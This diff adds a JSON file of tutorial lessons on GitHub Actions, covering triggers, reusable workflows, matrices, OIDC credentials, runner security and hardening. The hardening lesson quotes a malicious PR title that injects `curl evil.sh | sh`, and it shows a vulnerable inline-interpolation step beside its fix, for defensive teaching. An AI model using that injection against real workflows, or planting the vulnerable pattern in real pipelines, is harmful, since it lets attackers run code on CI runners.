@@ -1,0 +1,714 @@
+{
+  "introduction-automation-where-your-code-lives": {
+    "core": "GitHub Actions runs automation inside the platform that hosts your code. Any repository event (push, PR, issue, release, schedule) can trigger workflows, with native access to checks, tokens and the marketplace.",
+    "first_principles": {
+      "problem": "External CI systems need webhooks, separate credentials and context switching to connect to the repository.",
+      "truths": [
+        "Code events originate in the repo host.",
+        "Tight integration reduces glue.",
+        "Marketplace actions speed up reuse, and add supply-chain risk."
+      ],
+      "derivation": [
+        "**Workflows** live in .github/workflows.",
+        "**Events** trigger them.",
+        "**Jobs** run on runners; **steps** run actions or scripts.",
+        "Integrate with **checks, environments and OIDC**."
+      ]
+    },
+    "analogy": {
+      "title": "Public transit built into the city",
+      "story": "Instead of a separate company running buses across town, the city's own transit stops at every building.",
+      "mapping": [
+        [
+          "City",
+          "Repository"
+        ],
+        [
+          "Transit",
+          "Actions"
+        ],
+        [
+          "Stops",
+          "Events"
+        ]
+      ],
+      "breaks": "Being deeply tied to GitHub creates some lock-in."
+    },
+    "mindmap": {
+      "center": "GitHub Actions",
+      "branches": [
+        {
+          "label": "Events",
+          "children": [
+            "push",
+            "pull_request",
+            "schedule",
+            "release"
+          ]
+        },
+        {
+          "label": "Structure",
+          "children": [
+            "Workflow",
+            "Job",
+            "Step"
+          ]
+        },
+        {
+          "label": "Reuse",
+          "children": [
+            "Marketplace",
+            "Reusable workflows"
+          ]
+        },
+        {
+          "label": "Integrations",
+          "children": [
+            "Checks",
+            "Environments",
+            "OIDC"
+          ]
+        }
+      ]
+    },
+    "example": {
+      "title": "Automation beyond CI",
+      "scenario": "Many events.",
+      "flow": [
+        "PR → tests",
+        "Issue labelled → triage bot",
+        "Release → publish package",
+        "Nightly → dependency audit"
+      ],
+      "steps": [
+        {
+          "label": "Effect",
+          "detail": "One platform handles all repository automation."
+        }
+      ],
+      "code": [],
+      "outcome": "automation lives next to the code."
+    },
+    "summary": {
+      "points": [
+        "Event-driven.",
+        "Native integration.",
+        "Reusable actions."
+      ]
+    },
+    "check": [
+      {
+        "q": "Where do GitHub Actions workflows live?",
+        "a": "In YAML files under .github/workflows/ in the repository."
+      }
+    ]
+  },
+  "workflow-syntax-anatomy": {
+    "core": "A workflow file has `name`, `on` (triggers and filters), optional `permissions`, `env` and `concurrency`, and `jobs`. Each job has `runs-on`, `needs`, `if`, and `steps` that either `uses:` an action or `run:` a shell command.",
+    "first_principles": {
+      "problem": "YAML structure errors and misunderstood triggers cause workflows that never run, or run too often.",
+      "truths": [
+        "Triggers decide when work happens.",
+        "Jobs run in parallel unless they declare needs.",
+        "Expressions `${{ }}` give access to context."
+      ],
+      "derivation": [
+        "**on**: push/pull_request with branch and path filters.",
+        "**jobs.<id>.runs-on / needs / if**.",
+        "**steps**: `uses` (action@ref) or `run` (shell).",
+        "**concurrency**: cancel superseded runs."
+      ]
+    },
+    "analogy": {
+      "title": "A recipe book's structure",
+      "story": "Title, when to cook it, the dishes (jobs), the order of the dishes (needs) and the steps inside each.",
+      "mapping": [
+        [
+          "When to cook",
+          "on:"
+        ],
+        [
+          "Dishes",
+          "jobs"
+        ],
+        [
+          "Order",
+          "needs"
+        ],
+        [
+          "Recipe steps",
+          "steps"
+        ]
+      ],
+      "breaks": "Expressions are evaluated in different contexts, and secrets aren't available in `if` at the job level for forks."
+    },
+    "mindmap": {
+      "center": "Workflow Anatomy",
+      "branches": [
+        {
+          "label": "Top",
+          "children": [
+            "name",
+            "on",
+            "permissions",
+            "concurrency"
+          ]
+        },
+        {
+          "label": "Job",
+          "children": [
+            "runs-on",
+            "needs",
+            "if",
+            "strategy"
+          ]
+        },
+        {
+          "label": "Step",
+          "children": [
+            "uses",
+            "run",
+            "with",
+            "env"
+          ]
+        },
+        {
+          "label": "Expr",
+          "children": [
+            "${{ github.* }}"
+          ]
+        }
+      ]
+    },
+    "example": {
+      "title": "A complete small workflow",
+      "scenario": "Annotated.",
+      "flow": [],
+      "steps": [
+        {
+          "label": "Effect",
+          "detail": "It runs only when src changes, and old runs are cancelled on new pushes."
+        }
+      ],
+      "code": [
+        {
+          "lang": "yaml",
+          "text": "name: ci\non:\n  pull_request: { paths: ['src/**'] }\nconcurrency: { group: ci-${{ github.ref }}, cancel-in-progress: true }\npermissions: { contents: read }\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - run: make test"
+        }
+      ],
+      "outcome": "you can read and write workflows fluently."
+    },
+    "summary": {
+      "points": [
+        "on = triggers.",
+        "jobs + needs.",
+        "uses vs run."
+      ]
+    },
+    "check": [
+      {
+        "q": "What does `concurrency` with cancel-in-progress do?",
+        "a": "It cancels older running workflows in the same group when a newer one starts."
+      }
+    ]
+  },
+  "actions-vs-reusable-workflows": {
+    "core": "Actions package individual steps (JavaScript, Docker or composite). Reusable workflows (`workflow_call`) package entire jobs or pipelines. Use them to centralise standard logic across many repositories.",
+    "first_principles": {
+      "problem": "The same deploy logic is copy-pasted into 50 repos, and a security fix has to be applied 50 times.",
+      "truths": [
+        "Duplication spreads bugs.",
+        "Steps and whole pipelines have different scopes.",
+        "Versioned references allow controlled upgrades."
+      ],
+      "derivation": [
+        "**Composite action**: reusable steps.",
+        "**Reusable workflow**: reusable jobs (`on: workflow_call`).",
+        "Call with **uses: org/repo/.github/workflows/x.yml@v1**.",
+        "**Version** with tags and pass **inputs/secrets**."
+      ]
+    },
+    "analogy": {
+      "title": "A cooking technique vs. a complete set menu",
+      "story": "An action is a technique ('how to julienne'); a reusable workflow is the whole three-course menu.",
+      "mapping": [
+        [
+          "Technique",
+          "Action"
+        ],
+        [
+          "Set menu",
+          "Reusable workflow"
+        ],
+        [
+          "Menu edition",
+          "Version tag"
+        ]
+      ],
+      "breaks": "Nesting depth and secret-passing rules limit reusable workflows."
+    },
+    "mindmap": {
+      "center": "Reuse",
+      "branches": [
+        {
+          "label": "Actions",
+          "children": [
+            "JS",
+            "Docker",
+            "Composite"
+          ]
+        },
+        {
+          "label": "Reusable workflows",
+          "children": [
+            "workflow_call",
+            "Inputs",
+            "Secrets"
+          ]
+        },
+        {
+          "label": "Scope",
+          "children": [
+            "Step vs job"
+          ]
+        },
+        {
+          "label": "Versioning",
+          "children": [
+            "@v1",
+            "@sha"
+          ]
+        }
+      ]
+    },
+    "example": {
+      "title": "A central deploy workflow",
+      "scenario": "Called from many repos.",
+      "flow": [],
+      "steps": [
+        {
+          "label": "Effect",
+          "detail": "A fix in v3.1 reaches all 50 repos on their next bump."
+        }
+      ],
+      "code": [
+        {
+          "lang": "yaml",
+          "text": "# caller\njobs:\n  deploy:\n    uses: acme/platform/.github/workflows/deploy.yml@v3\n    with: { service: api, env: prod }\n    secrets: inherit"
+        }
+      ],
+      "outcome": "DRY automation across the organisation."
+    },
+    "summary": {
+      "points": [
+        "Actions = steps.",
+        "Reusable workflows = jobs.",
+        "Version them."
+      ]
+    },
+    "check": [
+      {
+        "q": "Which trigger makes a workflow reusable?",
+        "a": "on: workflow_call."
+      }
+    ]
+  },
+  "matrix-builds-testing-the-multiverse": {
+    "core": "`strategy.matrix` expands one job definition into parallel runs over combinations (OS × language version), with `include` and `exclude` to fine-tune them and `fail-fast` to control cancellation.",
+    "first_principles": {
+      "problem": "Testing on 3 Python versions × 2 OSes means 6 near-identical job definitions.",
+      "truths": [
+        "Compatibility must be tested across environments.",
+        "Combinations multiply.",
+        "Parallel runs save wall-clock time."
+      ],
+      "derivation": [
+        "Define the **matrix axes**.",
+        "Reference them as **${{ matrix.x }}**.",
+        "Use **include/exclude** for special cases.",
+        "Set **fail-fast: false** to see all failures, and **max-parallel** to cap concurrency."
+      ]
+    },
+    "analogy": {
+      "title": "Taste-testing a recipe in every oven type",
+      "story": "One recipe, baked simultaneously in gas, electric and convection ovens at different altitudes.",
+      "mapping": [
+        [
+          "Recipe",
+          "Job definition"
+        ],
+        [
+          "Oven types",
+          "Matrix axes"
+        ],
+        [
+          "Simultaneous baking",
+          "Parallel runs"
+        ]
+      ],
+      "breaks": "Matrices can explode combinatorially and burn runner minutes, so prune them."
+    },
+    "mindmap": {
+      "center": "Matrix",
+      "branches": [
+        {
+          "label": "Axes",
+          "children": [
+            "os",
+            "version"
+          ]
+        },
+        {
+          "label": "Tune",
+          "children": [
+            "include",
+            "exclude"
+          ]
+        },
+        {
+          "label": "Control",
+          "children": [
+            "fail-fast",
+            "max-parallel"
+          ]
+        },
+        {
+          "label": "Cost",
+          "children": [
+            "Combinatorial explosion"
+          ]
+        }
+      ]
+    },
+    "example": {
+      "title": "A Python library matrix",
+      "scenario": "6 combinations.",
+      "flow": [],
+      "steps": [
+        {
+          "label": "Effect",
+          "detail": "5 parallel jobs from one definition."
+        }
+      ],
+      "code": [
+        {
+          "lang": "yaml",
+          "text": "strategy:\n  fail-fast: false\n  matrix:\n    os: [ubuntu-latest, macos-latest]\n    python: ['3.10', '3.11', '3.12']\n    exclude: [ { os: macos-latest, python: '3.10' } ]\nruns-on: ${{ matrix.os }}\nsteps:\n  - uses: actions/setup-python@v5\n    with: { python-version: '${{ matrix.python }}' }"
+        }
+      ],
+      "outcome": "broad compatibility coverage with no duplication."
+    },
+    "summary": {
+      "points": [
+        "One definition, many runs.",
+        "include/exclude.",
+        "Watch the cost."
+      ]
+    },
+    "check": [
+      {
+        "q": "What does fail-fast: false change?",
+        "a": "Other matrix jobs keep running when one fails, so you see all failures."
+      }
+    ]
+  },
+  "secrets-and-oidc-credential-management-done-right": {
+    "core": "Prefer OIDC (`id-token: write`) for cloud access over static secrets. Use environment-scoped secrets with protection rules (reviewers, branches), least-privilege GITHUB_TOKEN permissions, and never echo secrets.",
+    "first_principles": {
+      "problem": "Long-lived AWS keys in repo secrets are available to every workflow and branch, and they leak in logs.",
+      "truths": [
+        "Static secrets persist and spread.",
+        "GitHub can mint OIDC tokens per job.",
+        "Environments can gate access."
+      ],
+      "derivation": [
+        "Set **permissions: { id-token: write }** and use the cloud's assume-role action.",
+        "Use **environment secrets** with required reviewers.",
+        "Set the default **contents: read** for GITHUB_TOKEN.",
+        "**Mask** any dynamic values (::add-mask::)."
+      ]
+    },
+    "analogy": {
+      "title": "Temporary visitor passes",
+      "story": "Instead of copying a master key for everyone, each visitor gets a timed pass for one area, approved by security.",
+      "mapping": [
+        [
+          "Master key copies",
+          "Static repo secrets"
+        ],
+        [
+          "Timed pass",
+          "OIDC credentials"
+        ],
+        [
+          "Security approval",
+          "Environment reviewers"
+        ]
+      ],
+      "breaks": "OIDC trust policies must restrict repo, branch and environment, or any workflow can assume the role."
+    },
+    "mindmap": {
+      "center": "Credentials",
+      "branches": [
+        {
+          "label": "OIDC",
+          "children": [
+            "id-token: write",
+            "AssumeRole"
+          ]
+        },
+        {
+          "label": "Secrets",
+          "children": [
+            "Environment-scoped",
+            "Reviewers"
+          ]
+        },
+        {
+          "label": "Token",
+          "children": [
+            "Least-privilege permissions"
+          ]
+        },
+        {
+          "label": "Hygiene",
+          "children": [
+            "Mask",
+            "No echo"
+          ]
+        }
+      ]
+    },
+    "example": {
+      "title": "A production deploy job",
+      "scenario": "Gated and keyless.",
+      "flow": [],
+      "steps": [
+        {
+          "label": "Effect",
+          "detail": "There's no stored AWS key, and it deploys only after approval from main."
+        }
+      ],
+      "code": [
+        {
+          "lang": "yaml",
+          "text": "deploy:\n  environment: production   # requires approval\n  permissions: { id-token: write, contents: read }\n  steps:\n    - uses: aws-actions/configure-aws-credentials@v4\n      with: { role-to-assume: arn:aws:iam::1234:role/gh-prod, aws-region: us-east-1 }"
+        }
+      ],
+      "outcome": "credentials are short-lived, scoped and gated."
+    },
+    "summary": {
+      "points": [
+        "OIDC over static keys.",
+        "Environment protection.",
+        "Least-privilege token."
+      ]
+    },
+    "check": [
+      {
+        "q": "What permission does a job need for GitHub OIDC?",
+        "a": "id-token: write."
+      }
+    ]
+  },
+  "self-hosted-runner-security": {
+    "core": "Self-hosted runners on public repos let anyone's fork PR run code on your infrastructure. Use them only for trusted workflows, make them ephemeral, isolate them in runner groups, and segment their network.",
+    "first_principles": {
+      "problem": "A fork PR runs a crypto miner or reads credentials left on a persistent self-hosted runner inside your network.",
+      "truths": [
+        "PR code executes on the runner.",
+        "Persistent runners keep state.",
+        "Runners often sit inside private networks."
+      ],
+      "derivation": [
+        "**Never** use self-hosted runners for public fork PRs.",
+        "Use **ephemeral** runners (--ephemeral, ARC).",
+        "Use **runner groups** restricted to specific repos and workflows.",
+        "Use **least-privilege** IAM and segmented networks."
+      ]
+    },
+    "analogy": {
+      "title": "Letting strangers use your workshop",
+      "story": "If anyone can walk in and use the tools, they can also take the keys hanging on the wall.",
+      "mapping": [
+        [
+          "Workshop",
+          "Self-hosted runner"
+        ],
+        [
+          "Strangers",
+          "Fork PR authors"
+        ],
+        [
+          "Keys on the wall",
+          "Credentials/state"
+        ]
+      ],
+      "breaks": "Even private repos have insider and compromised-account risks, so stay ephemeral."
+    },
+    "mindmap": {
+      "center": "Self-Hosted Security",
+      "branches": [
+        {
+          "label": "Risk",
+          "children": [
+            "Fork PRs",
+            "Persistent state",
+            "Network access"
+          ]
+        },
+        {
+          "label": "Controls",
+          "children": [
+            "Ephemeral",
+            "Runner groups",
+            "No public forks"
+          ]
+        },
+        {
+          "label": "Infra",
+          "children": [
+            "ARC on K8s",
+            "Segmented network",
+            "Least privilege"
+          ]
+        }
+      ]
+    },
+    "example": {
+      "title": "An ARC ephemeral runner scale set",
+      "scenario": "Kubernetes.",
+      "flow": [
+        "Job queued",
+        "ARC creates fresh runner pod",
+        "Job runs",
+        "Pod destroyed"
+      ],
+      "steps": [
+        {
+          "label": "Effect",
+          "detail": "Each job starts clean, and nothing persists."
+        }
+      ],
+      "code": [],
+      "outcome": "self-hosted capacity without self-inflicted breaches."
+    },
+    "summary": {
+      "points": [
+        "No forks on self-hosted.",
+        "Ephemeral.",
+        "Restrict and segment."
+      ]
+    },
+    "check": [
+      {
+        "q": "Why are self-hosted runners dangerous on public repos?",
+        "a": "Anyone can open a PR whose code then runs on your infrastructure."
+      }
+    ]
+  },
+  "workflow-security-hardening": {
+    "core": "Harden workflows: pin third-party actions to full commit SHAs, set minimal permissions, avoid script injection from untrusted inputs (titles, branch names), be careful with pull_request_target, and audit with tools like zizmor or OpenSSF Scorecard.",
+    "first_principles": {
+      "problem": "A PR titled `\"; curl evil.sh | sh #` injects shell code into a step that interpolates github.event.pull_request.title.",
+      "truths": [
+        "Tags on actions can be moved.",
+        "`${{ }}` is substituted before the shell parses the line.",
+        "The default token permissions may be broad."
+      ],
+      "derivation": [
+        "**Pin actions by SHA** (with Dependabot updates).",
+        "Set **permissions** at workflow or job level.",
+        "Pass untrusted input through **env vars**, never inline `${{ }}` in run:.",
+        "Restrict **pull_request_target**; scan with **zizmor/Scorecard**."
+      ]
+    },
+    "analogy": {
+      "title": "Food safety in a kitchen",
+      "story": "Sealed supplier batches (SHA pins), minimal knife access (permissions), and never taking an ingredient from a stranger without inspecting it (input sanitising).",
+      "mapping": [
+        [
+          "Sealed batch",
+          "SHA-pinned action"
+        ],
+        [
+          "Knife access",
+          "Token permissions"
+        ],
+        [
+          "Stranger's ingredient",
+          "Untrusted input"
+        ]
+      ],
+      "breaks": "Pinning means you must update deliberately, so automate it."
+    },
+    "mindmap": {
+      "center": "Hardening",
+      "branches": [
+        {
+          "label": "Pin",
+          "children": [
+            "Actions @sha"
+          ]
+        },
+        {
+          "label": "Permissions",
+          "children": [
+            "Minimal",
+            "Per job"
+          ]
+        },
+        {
+          "label": "Injection",
+          "children": [
+            "Use env, not inline ${{ }}"
+          ]
+        },
+        {
+          "label": "Triggers",
+          "children": [
+            "pull_request_target care"
+          ]
+        },
+        {
+          "label": "Audit",
+          "children": [
+            "zizmor",
+            "Scorecard"
+          ]
+        }
+      ]
+    },
+    "example": {
+      "title": "Fixing script injection",
+      "scenario": "Before and after.",
+      "flow": [],
+      "steps": [
+        {
+          "label": "Effect",
+          "detail": "The title is treated as data, not code."
+        }
+      ],
+      "code": [
+        {
+          "lang": "yaml",
+          "text": "# vulnerable\n- run: echo \"${{ github.event.pull_request.title }}\"\n# safe\n- env: { TITLE: \"${{ github.event.pull_request.title }}\" }\n  run: echo \"$TITLE\""
+        }
+      ],
+      "outcome": "workflows resist supply-chain and injection attacks."
+    },
+    "summary": {
+      "points": [
+        "Pin SHAs.",
+        "Minimal permissions.",
+        "No inline untrusted input."
+      ]
+    },
+    "check": [
+      {
+        "q": "Why pin actions to a commit SHA instead of a tag?",
+        "a": "Tags can be moved to malicious code, while a SHA is immutable."
+      }
+    ]
+  }
+}
